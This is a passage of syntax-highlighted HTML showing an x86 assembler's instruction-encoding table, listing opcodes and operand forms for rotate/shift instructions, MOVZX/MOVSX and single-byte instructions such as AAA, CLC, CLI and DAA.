 </span><span class="sc5">instruction16</span><span class="sc0">  </span><span class="sc6">RCL</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101000000010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CL0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101001000010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16</span><span class="sc0">            </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000010000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">RCR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101000000011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CL0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101001000011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">ROL</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CL0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101001000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">ROR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101000000001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CL0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101001000001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000001000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">SAR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101000000111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CL0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101001000111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101000000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CL0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101001000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000100000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction16b</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101000000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CL0</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1101001000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance16b</span><span class="sc0">           </span><span class="sc5">Mem</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1100000000101000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction</span><span class="sc0">  </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011011000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">variance</span><span class="sc0">            </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011011100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instructionb</span><span class="sc0"> </span><span class="sc6">MOVSX</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem8</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011111000000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
    </span><span class="sc5">varianceb</span><span class="sc0">           </span><span class="sc5">RegWord</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Mem16</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1011111100000000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 

 </span><span class="sc5">instruction8</span><span class="sc0">  </span><span class="sc6">AAA</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00110111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">AAS</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CLC</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CLD</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111100b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CLI</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111010b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CMC</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11110101b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CMPSB</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10100110b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CMPSD</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10100111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CWD</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011001b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">CWDE</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10011000b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
 </span><span class="sc5">instruction8b</span><span class="sc0"> </span><span class="sc6">DAA</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00100111b</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
